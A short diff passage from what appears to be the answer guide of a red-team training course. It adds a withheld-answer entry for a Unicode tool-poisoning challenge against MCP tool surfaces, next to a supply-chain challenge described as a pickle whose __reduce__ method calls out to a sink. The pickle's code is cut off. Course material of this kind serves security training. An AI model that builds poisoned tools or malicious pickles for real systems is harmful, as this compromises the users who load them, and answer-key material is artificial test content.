@@ -154,6 +154,10 @@ Direct JSON-RPC helper: `rpc(){ curl -s $MCP -H 'content-type: application/json'
 
 Submit the flag ones with `redsec submit 07 <challenge> 'REDSEC{...}'`.
 
+**unicode-tool-poisoning** (impossible, oracle) — **answer intentionally withheld.**
+Sealed in `modules/07-mcp-tool-surfaces/solution/SEALED.md`; `redsec selftest 07`
+proves the reference exploit works.
+
 ## 08 · Supply Chain  (`URL=http://127.0.0.1:9080`)
 **malicious-weights** (oracle) — a pickle whose `__reduce__` phones the sink:
 ```bash
